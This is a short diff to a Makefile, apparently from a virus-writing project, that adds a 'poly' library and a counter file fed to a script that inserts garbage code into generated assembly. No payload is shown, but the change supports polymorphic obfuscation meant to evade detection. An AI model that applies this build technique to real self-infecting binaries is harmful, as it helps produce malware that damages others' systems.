@@ -12,7 +12,7 @@ TMP_DIR				= .tmp
 OBJ_DIR				= $(TMP_DIR)/obj
 
 TABLE_C = $(TMP_DIR)/table.c
-LIBFLAGS = -I lib/infect -I lib/ft_lib -I lib/crypto -I lib/formats -I lib/hacks
+LIBFLAGS = -I lib/infect -I lib/ft_lib -I lib/crypto -I lib/formats -I lib/hacks -I lib/poly
 VIRUS = virus
 
 FTLIB_SRC = ft_io.c ft_string.c ft_lib.c call.s
@@ -79,6 +79,7 @@ $(OBJ_DIR):
 	mkdir -p $@
 	python -c 'import os,sys;dirs=[ r for r,s,f in os.walk(".") if r != "."];[os.makedirs(os.path.join(sys.argv[1],i)) for i in dirs]' $(OBJ_DIR)/.
 	rm -rf $(OBJ_DIR)/others
+	echo "0" > .tmp/total.tmp
 
 ##
 ## GARBAGE CODE
@@ -96,7 +97,7 @@ fn_list: $(VIRUS)
 
 $(OBJ_DIR)/%.s: $(OBJ_DIR)/%.gs
 	@cp $< $<.tmp
-	@./others/scripts/add_garbage $< -p 10 -l toto $(shell cat fn_list) || cp $< $@
+	@./others/scripts/add_garbage $< -p 10 -l toto $(shell cat fn_list) -sf .tmp/total.tmp || cp $< $@
 	@cp $@ $@.tmp2
 
 $(TABLE_C): $(OBJ_NO_TABLE)
